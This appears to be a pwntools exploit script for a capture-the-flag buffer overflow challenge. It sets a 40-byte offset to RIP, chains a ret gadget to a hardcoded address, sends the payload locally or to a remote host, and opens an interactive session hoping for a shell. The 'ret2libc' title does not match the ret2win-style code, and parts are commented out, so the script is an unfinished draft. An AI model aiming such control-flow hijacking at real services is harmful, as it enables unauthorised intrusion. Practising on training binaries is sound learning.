# ret2libc challenge

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
break main
break fill
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './ret2win'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# pwntools will get the context arch, bits, os and other useful parameters
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to RIP, find manually with gdb
offset = 40

# Start program
io = start()

pop_rdi = 0x4007e3
ret = 0x40053e



payload = flat({
    offset: [
        #pop_rdi,  # Pop got.puts into RDI,
        ret,
        0x400756
    ]
})








io.sendlineafter(b'> ', payload)
io.recvline(10)


# Get Shell?
io.interactive()

